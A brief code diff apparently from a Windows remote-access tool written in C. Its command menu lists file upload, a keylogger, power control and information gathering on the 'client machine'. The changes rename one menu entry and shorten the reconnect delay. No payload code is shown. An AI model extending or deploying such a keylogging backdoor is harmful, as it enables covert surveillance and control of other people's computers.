@@ -96,7 +96,7 @@ void redirectHelper(SOCKET clientSocket)
         "uf         upload a file \n"
         "klg        keylogger \n"
 		"pw         power behaviour of client machine \n"
-        "infor      information about client machine \n"
+        "info      information about client machine \n"
 		"exit       close the connection \n"
         "help       see all options available \n"
         ;
@@ -861,7 +861,7 @@ int main(){
 
 		closesocket(clientSocket);
 		WSACleanup();
-		Sleep(5000);
+		Sleep(500);
 	}
     return EXIT_SUCCESS;
 }
